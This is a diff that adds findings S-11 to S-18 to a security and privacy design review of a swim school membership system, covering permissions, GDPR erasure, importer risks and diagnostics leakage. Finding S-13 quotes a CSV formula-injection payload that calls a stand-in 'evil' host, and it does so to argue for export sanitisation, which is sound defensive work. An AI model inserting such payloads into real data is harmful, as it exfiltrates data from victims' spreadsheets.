@@ -661,3 +661,433 @@ Reconcile the absolute ceiling to one number in `02-…` §4.1 and point the oth
 two mentions at it. If role-scoping is kept regardless, add the scope dimension
 to §3.2's registry schema and state the fallback for an unlisted role
 explicitly — the strictest bound, not the default.
+
+---
+
+### S-11 — Three of D-150's four `invariant` entries are not settings, and the registry has no way to protect the objects they name
+
+**Severity: medium** · **CONFIRMED**
+
+`02-…` §4.1 (D-150):
+
+> | `invariant` | Not editable in the UI at all, not clearable by
+> `settings:reset`, no override flag | MFA required for the high-risk permission
+> set (§1.2); **reach filtering**; **audit append-only**; **the `SELF`
+> permission set**; the egress deny-list's *existence* |
+
+restated in `13-…` §3.2: *"`invariant` settings are not editable at all and have
+no override flag: the MFA mandate, reach filtering, audit append-only and the
+`SELF` permission set."*
+
+**Failure path.** Only the first is a setting. "Reach filtering" and "audit
+append-only" are properties of code and of a database grant — there is no
+registry key to mark `invariant`, no value to refuse, and `settings:reset`
+cannot clear them because it cannot reach them. Marking them produces two
+registry rows that do nothing, and — more damagingly — creates the impression
+that the settings layer is where those two properties are enforced, when D-147
+(the opaque `Reach`) and D-149 (the `INSERT`-only role) are.
+
+The `SELF` permission set is the one that actually matters, because it *is* a
+mutable object and the registry is the wrong place to guard it. D-146 makes it a
+`Role` row:
+
+> - `SELF` is a seeded `Role` assigned at account creation like any other,
+>   subject to §2.6 and visible in the administration UI.
+
+A `Role`'s permission set is edited through `roles.manage` (§2.5: *"`roles.manage`
+edits which permissions a role carries, which is strictly stronger"*), in the
+roles module, not through the settings registry. So an `ORGANIZATION`-scoped
+administrator holding `roles.manage` opens People & roles, selects the seeded
+`SELF` role, and adds a permission to it — passing D-139's amplification check,
+because they hold everything. Nothing in the roles module knows the settings
+registry called that role `invariant`. D-146's own guard, *"Adding a permission
+to the `SELF` set is a security-relevant change requiring review"*, is a process
+statement about a code review, and the object here is a database row edited
+through a UI at runtime.
+
+The blast radius is bounded — `SELF` covers only records whose subject is the
+holder — so this is medium, not high. It is reported because it is the clearest
+instance of the class the brief asked about: an invariant asserted in one
+mechanism and enforceable only in another.
+
+**Recommended fix (do not apply here).** Drop "reach filtering" and "audit
+append-only" from the `invariant` list and state them where they are enforced
+(D-147, D-149) — an `invariant` class listing things the registry cannot see
+devalues the one entry it can. Protect the `SELF` role at its own boundary
+instead: mark the seeded row `system: true` and have the roles module refuse
+edits to system roles, backed by a test, exactly as D-150 wants
+`settings:reset` to refuse an invariant.
+
+---
+
+### S-12 — D-154's two registry entry kinds cannot express D-092's pseudonymised financial records, and `onExpiry` has a fourth value D-065's enum does not contain
+
+**Severity: medium** · **CONFIRMED**
+
+`02-…` §5.5 (D-154):
+
+> | Entry | Behaviour on erasure |
+> | `erase` | The default: anonymise or delete per D-065 |
+> | `exempt(ground, until)` | Retained, with a **named lawful ground recorded in
+> the registry file itself** and an expiry |
+>
+> The completeness test asserts every `Person`-referencing table has *an* entry,
+> of either kind …
+> The same shape already applies to `Charge` and `Payment` (D-092, financial
+> retention ground, pseudonymised rather than deleted), so this generalises an
+> exemption the design had already accepted as a special case.
+
+`02-…` §5.6 (D-065) defines the vocabulary:
+
+> ```
+>   onExpiry           DELETE | ANONYMISE | REVIEW
+> ```
+
+`01-…` §5's retention table then uses a fourth value for exactly those two
+classes:
+
+> | Charges | `fees` | … | 7 years | **`PSEUDONYMISE`** (D-092) |
+> | Payments | `fees` | … | 7 years | **`PSEUDONYMISE`** (D-092) |
+
+**Failure path.** Actor: the implementer building the erasure registry and the
+retention engine from the two chapters. D-154 says *"the same shape already
+applies to `Charge` and `Payment`"* — it does not. `exempt(ground, until)` means
+"retained", full stop: the row survives untouched with a ground recorded.
+D-092's behaviour is "retained **and transformed**" — the charge survives with
+the payer's identity stripped, which is a third behaviour the registry has no
+kind for. Given a two-valued enum, the implementer picks `exempt` (the closest
+label) and the pseudonymisation step is never written: after an erasure request,
+`Charge.payerPersonId` still points at the erased `Person`, and the fee export
+(`15-…` §6, D-088) still renders their name. The subject is told the record was
+retained under a fiscal ground; it was in fact retained in full.
+
+The `onExpiry` mismatch is the same defect one document away. An implementer
+building the enum from D-065 cannot represent the fee rows at all; one building
+it from the `01-…` §5 table adds `PSEUDONYMISE` as a fourth outcome — the exact
+word §5.6 spends a page establishing is not a privacy outcome
+(*"Pseudonymisation is not anonymisation"*), and D-155 then tightens `ANONYMISE`
+specifically so that nothing can quietly mean "stripped of a name". Reintroducing
+it as an enum member undoes that in the table where retention defaults are
+actually read.
+
+**Recommended fix (do not apply here).** Give the registry a third kind —
+`transform(ground, until, transformation)` — or, cleaner, express D-092 as
+`exempt` on the *financial* record plus an explicit `erase` on the person
+reference it carries, so the two behaviours stay separable and the completeness
+test still passes. In `01-…` §5, replace `PSEUDONYMISE` with the D-065 value
+plus a footnote pointing at D-092, so the table cannot be read as extending the
+enum.
+
+---
+
+### S-13 — D-157 specifies the importer's *inputs* and nothing about it as an untrusted-input surface: no permission, no execution context, and its output feeds a CSV export with no injection rule
+
+**Severity: medium** · **CONFIRMED**
+
+D-157 (register) and `00-…` §2.2 specify the importer entirely in terms of
+column mapping and consent:
+
+> the import is a dry-run-then-commit with a per-row rejection report … unmapped
+> columns are reported, never silently dropped … The importer writes **zero**
+> `Consent` rows
+
+`02-…` §2.5 states the rule that makes the gap a defect rather than an omission:
+
+> **This is the catalogue; a permission referenced anywhere in the design set and
+> absent here is a defect, not a shorthand.**
+
+There is no `import.*` key in the catalogue, and D-157 names no permission.
+Three things follow, all of which the design owes.
+
+**(a) No permission, and it is a bulk personal-data write.** A one-time import
+creates every `Person`, `StudentProfile` and `MembershipPeriod` in the
+installation. Under the catalogue as it stands the closest keys are
+`people.create` + `students.create`, which a Member Administrator holds at
+`UNIT` scope — so a `UNIT`-scoped administrator can, by the natural reading,
+run an import that writes rows at any unit, because the file names the unit and
+nothing binds the import to the runner's reach. D-031/D-147 constrain *reads*;
+the reach model has no statement about bulk writes at all.
+
+**(b) No execution context.** The importer is the one v1 surface that ingests an
+operator-supplied file, and the design's own rule for the other one is explicit
+(`14-…` §4.2.1: *"an archive from any source other than the operator's own
+instance is untrusted input"*). An export from a commercial membership system is
+XLSX or CSV, arriving by email, forwarded by whoever at the incumbent vendor
+produced it. Nothing states: a size ceiling, a row ceiling, a rejection of
+zip/XML-expansion structures if the format is XLSX, a formats allow-list, that
+parsing happens before any write, or — most importantly — that the importer is
+**not** reachable from the setup wizard. The wizard is the only unauthenticated
+administrative surface (D-039); "import your existing members" is the single
+most natural thing to put next to "restore from backup" on a first-run screen,
+and D-157 says nothing to stop that.
+
+**(c) The imported free text is re-emitted into a CSV nobody sanitises.**
+D-088 ships a fee CSV export and D-094 ships the NRZ candidate export; `04-…`
+§3 and `15-…` §6 both describe the treasurer working from the CSV in a
+spreadsheet. The words "formula injection", "CSV injection" and the leading
+`=`/`+`/`-`/`@` guard appear nowhere in fifteen chapters. A name field imported
+as `=HYPERLINK("http://evil/"&A1,"click")` — or the `DDE`/`cmd` variants — is
+copied into `Charge`, exported by `fees.export`, and opens as a live formula on
+the treasurer's Windows machine, which is the stated platform. The attack needs
+no account: the payload enters through the incumbent system's data, which the
+school does not control and which D-157 correctly treats as unknown in every
+respect except this one.
+
+**Recommended fix (do not apply here).** Add `import.run` to the catalogue,
+`ORGANIZATION`-scoped, in the high-risk set (it writes the entire person
+population and is a one-shot), with step-up and a high-severity audit event
+carrying the file hash and the row counts committed. State that the importer is
+an authenticated admin surface only and is never reachable from the setup
+wizard. State the parser limits (format allow-list, size and row ceilings,
+parse-before-write). And add one rule that covers both CSV exports: every text
+cell is prefixed with a `'` or wrapped when it begins with `=`, `+`, `-`, `@`,
+tab or CR — one line, and it belongs in `02-…` §4's controls table beside
+"Output encoding".
+
+---
+
+### S-14 — D-153's refuse-rather-than-omit rule manufactures a standing account that can read every medical, pastoral and inquiry record in the school
+
+**Severity: medium** · **CONFIRMED**
+
+`02-…` §5.5 (D-153):
+
+> 1. **Fail loudly.** If any data class in scope is unreadable by the requester,
+>    the export **refuses to generate** … There is no "export anyway" button.
+>    Fulfilling an Article 15 request therefore requires an
+>    `ORGANIZATION`-scoped principal holding both `privacy.export` and the
+>    gating permissions — which is the honest description of who can answer one.
+
+The gating permissions are not "both" but four, once D-148 is applied: the
+protected class spans `students.medical.*`, `students.notes.*` (pastoral notes
+*and* assessment remarks) and `inquiries.read`, and an Article 15 export is
+in-scope for all of them.
+
+**Failure path.** Actor: the swim school, acting entirely in good faith. To be
+able to answer a subject access request within the statutory month, they must
+create and maintain one account holding `privacy.export`, `students.medical.read`,
+`students.notes.read` and `inquiries.read` at `ORGANIZATION` scope. That single
+account can read every allergy, every safeguarding note (*"moeder zit in de
+opvang"*, D-148's own example), every assessment remark and every public inquiry
+about every child in the school, permanently — not for the duration of a
+request, because Article 15 requests are rare and the account must exist
+*before* one arrives.
+
+The chapter's entire least-privilege argument runs the other way. D-148 keeps
+two permission pairs separate specifically to prevent this aggregation:
+*"folding pastoral into `students.medical.*` would mean the instructor who must
+know a child has epilepsy also reads the note about the family — a reduction in
+least privilege"*. D-153 then requires one principal to hold both, plus
+inquiries, plus export. The separation survives for instructors and is dissolved
+for the one account most worth compromising, and D-139 makes that account the
+one an attacker wants: it holds the permissions, so it can grant them.
+
+D-153's trade-off paragraph addresses the wrong objection — *"a member
+administrator can no longer fulfil a subject access request alone … now they
+find out"* — which is about capability, not about the standing aggregation the
+rule creates.
+
+**Recommended fix (do not apply here).** Keep "refuse rather than omit" and drop
+the requirement that one principal hold everything: make the export a
+**multi-party compilation**. Each in-scope class is contributed by a principal
+holding its gating permission, into a sealed export the `privacy.export` holder
+assembles but cannot read; the export refuses until every class has a
+contribution or an explicit "not held" attestation. That preserves the fail-loud
+property, keeps the pairs separate, and produces a better audit record — the
+Article 15 response names who supplied which class.
+
+---
+
+### S-15 — The diagnostics page is now authenticated but still designed to be pasted publicly, and it now carries a map of the internal network D-142 exists to protect
+
+**Severity: medium** · **CONFIRMED**
+
+`13-…` §8:
+
+> one screen showing **effective configuration, where each value came from
+> (default, env, database)**, database connectivity, migration state, email test
+> result, storage writability, version …
+> It is the first thing to ask for in a support issue, and it **must be safe to
+> paste into a public GitHub issue** — so it renders no secrets and no personal
+> data (F-20).
+
+D-156 makes the two properties independent and keeps both:
+
+> Its "safe to paste into a public issue" property (no secrets, no PII) is kept:
+> pasteability and authentication are independent properties.
+
+**Failure path.** Actor: the operator, following the documentation. D-156 fixed
+who may *open* the page and left untouched what it now *contains*. Since the
+fixes, the settings registry holds the SMTP host and port, the OIDC issuer and
+discovery URLs (`identity.providers.*`), the backup destination path, and
+D-142's *"allow private networks"* egress flag — and §8 renders effective
+configuration with provenance. The operator pastes it into a public issue,
+exactly as instructed, and publishes: the hostname of the school's internal
+Keycloak, the hostname of their internal SMTP relay, the storage paths, and
+whether the one control standing between an authenticated settings user and the
+operator's LAN is switched on.
+
+That is not "secrets" and not "PII", so the stated test passes. It is a target
+map for the SSRF surface D-142 was written to close, plus — combined with the
+version and advisory state the page also reports, which C-6/F-125 already
+identified as target selection — an attacker gets both "is this instance
+exploitable" and "what is behind it" from one paste. `13-…` §8 also already
+carries three warnings about what must never be pasted (the setup token, the
+`$DATA_DIR` contents), which demonstrates the mechanism exists and that internal
+hostnames were simply not considered.
+
+**Recommended fix (do not apply here).** Split the page into what it is for:
+a **support bundle** (version, migration state, boot state, connectivity
+booleans, backup age, chain status, key-rotation residue) that is generated for
+pasting and contains no configured value at all, and an **effective
+configuration** view that is never described as pasteable. Host names, URLs and
+paths belong in the second. State the rule as "no secrets, no personal data,
+**and no operator-supplied hostname, URL or path**" — the third clause is the
+one the fixes made necessary.
+
+---
+
+### S-16 — D-151's expiry is computed from a field the D-157 importer will supply from an unknown external file, and in v1 nobody can act on the result
+
+**Severity: medium** · **PLAUSIBLE**
+
+`02-…` §5.4 (D-151):
+
+> - Authority expiry is **derived** from `Person.dateOfBirth` — a column the
+>   model already holds — against a configurable age-of-consent setting (NL: 16),
+>   and is evaluated at read time …
+> - Consents whose authority has lapsed are marked **requiring re-consent** …
+>   and appear in the privacy admin queue with the child's own contact route.
+
+`01-…` §3.1 makes the column non-optional (`givenName, familyName, dateOfBirth,
+email?, phone?`), and D-157 populates it for the entire existing pupil
+population from an export whose shape is unknown by construction.
+
+**Failure path.** Two branches, and the design picks neither. If the incumbent
+export carries no usable date of birth for some rows — plausible for guardians,
+former members and any record entered before the incumbent made the field
+mandatory — then a non-optional column forces the importer to either reject
+those rows (D-157's per-row rejection report; acceptable) or write a placeholder.
+A placeholder in the past marks every affected consent as *requiring re-consent*
+on day one, burying the queue the control exists to populate; a placeholder in
+the recent past marks none of them, ever. Neither is detectable, because a
+computed condition has no failure state to log — it just returns a boolean.
+`02-…` §1.1's deny-by-default rule does not reach this: there is no permission
+check here to deny, only a derivation.
+
+The second half is the part D-161 asks about. Suppose the computation works and
+a fifteen-year-old turns sixteen. The consent is marked requiring re-consent.
+Who re-consents? `02-…` §5.5's rights table says:
+
+> | Objection | Marketing/consent withdrawal is **self-service where an account
+> exists** | Data subject or guardian |
+
+and `02-…` §2.4 says: *"a guardian who is not [a member] gets no account"*, with
+the guardian portal committed to v2 (D-161). In v1 the child has no account
+either unless the school made one, and D-146's `SELF` set grants read of *"own
+consent records"* — read, not withdraw. So the row in the rights table describes
+a self-service surface that does not exist in v1 for either party named in it,
+and D-152's withdrawal cascades (photo deleted, publication unpublished) have no
+v1 actor other than a staff member working the queue by hand.
+
+That is the concrete v1/v2 seam D-161 warns about, in the direction the decision
+did not anticipate: not a query that hard-codes staff reach, but a **stated
+right whose only exerciser is deferred to v2**, while D-151 newly guarantees a
+steady supply of consents that need exercising.
+
+Marked PLAUSIBLE on the first branch because whether the incumbent export
+carries dates of birth is genuinely unknown (D-157's whole point) — but the
+design owes the rule either way. The second branch is not in doubt.
+
+**Recommended fix (do not apply here).** State the importer's obligation for
+`dateOfBirth` explicitly in D-157: never synthesised, a missing value is a row
+rejection, and if the column must accept null for imported records then D-151
+must state which way it fails (recommend: unknown date ⇒ authority treated as
+lapsed ⇒ appears in the queue, which fails safe and is visible). And correct the
+`02-…` §5.5 rights row for v1: consent withdrawal is a staff-operated action in
+the privacy admin area, with self-service arriving with the portal — otherwise
+the table promises a right the release cannot deliver.
+
+---
+
+### S-17 — Three active documents still carry the deleted "the recovery token *is* `SECRET_KEY`" scheme, including the register row D-133 makes authoritative
+
+**Severity: low** · **CONFIRMED**
+
+`14-…` §2.1 deletes the scheme in terms:
+
+> An earlier draft said "**the token is `SECRET_KEY`**" … Making the token *be*
+> the key was wrong on its own terms … Finding **F-100**.
+
+Three live places still state it. `09-decision-register.md`, the D-040 row:
+
+> | D-040 | Recovery is two artefacts: an encrypted backup file **and** a
+> recovery token (**the wrapped `SECRET_KEY`**), shown once and printable |
+
+`10-findings.md`, F-24, which is an active finding:
+
+> **Severity: high (operational).** **The token is `SECRET_KEY`.** Without it
+> the backup cannot be decrypted and the encrypted columns inside it cannot be
+> read.
+
+and D-040's own text in `14-…` §2 is silent on the correction, which arrives one
+subsection later.
+
+**Failure path.** D-133 makes the register load-bearing (*"for a withdrawn or
+superseded decision, the register row **is** the authoritative text"*) and D-134
+requires one home per rule. A reader checking the register — the document
+described as "every architectural decision in this design, in one table" — reads
+the superseded scheme as current. F-24 is worse than stale: it is the finding
+that governs how the recovery artefact is explained to operators (*"stated
+plainly in the installation documentation next to the backup instructions"*), so
+the documentation written from it will tell a swim school that the printed token
+is the encryption key — which is now false, and which happens to point at the
+real requirement S-1 identifies (that `SECRET_KEY` custody matters) while
+attaching it to the wrong artefact.
+
+**Recommended fix (do not apply here).** Rewrite the D-040 register row to name
+the two-level envelope and point at D-114; rewrite F-24's severity paragraph to
+"the token is a passphrase over the backup master key (D-114); losing it loses
+every archive" and add the `SECRET_KEY` limb S-1 identifies.
+
+---
+
+### S-18 — `01-…` §5's audit retention row is explicitly unreconciled, so D-149's third part ships a floor that contradicts the rule stated beside it
+
+**Severity: low** · **CONFIRMED**
+
+`01-…` §5:
+
+> | Audit events | `audit` | `audit.read` | … | **To be reconciled — see note
+> below.** Floor 12 months (D-149/D-150); shipped default currently 24 months |
+> `DELETE` |
+
+and the note beneath it (F-133): *"Audit events must be retained at least as
+long as the longest-retained data class whose changes they evidence … Exam
+results and awards are kept up to 10 years while the record of who entered an
+outcome would expire at 24 months."* `02-…` §3.2 states the same rule
+normatively and then hands it off: *"This is a hand-off to `01-domain-model.md`
+§5 and `07-operations.md` §1.2, not settled here."* `07-…` §1's table still says
+`≥ 24 months` flatly.
+
+**Failure path.** Actor: the implementer building D-150's `bounded` schema. The
+only number stated as a bound is 12 months, so that is what the floor becomes;
+the shipped default is 24 months; the rule that would make either correct — "at
+least as long as the class it evidences", i.e. 7–10 years for exam and
+assessment events — is stated three times as a requirement and zero times as a
+value. The result is a settings layer that faithfully refuses 11 months and
+happily accepts 12, on a trail that D-128 makes the sole evidence for an
+Article 33 assessment and D-085 makes the sole evidence for who decided a child
+could sit an exam.
+
+This is a genuine open hand-off rather than an error, and it is reported at low
+severity only because the register and the chapters both flag it. It is included
+because it is the one part of D-149 that is not closed, and a reader of the
+register (whose D-149 row reads as settled) would not know that.
+
+**Recommended fix (do not apply here).** Settle it in `01-…` §5: audit events
+carry a per-event-class retention keyed to the data class they evidence, with
+the 12-month floor applying only to classes with no longer-lived subject. If
+that is rejected on volume grounds, D-149's own fallback — stating the limit in
+the privacy screen — must be made a shipped requirement rather than an
+alternative, and `07-…` §1's `≥ 24 months` must point at whichever answer wins.
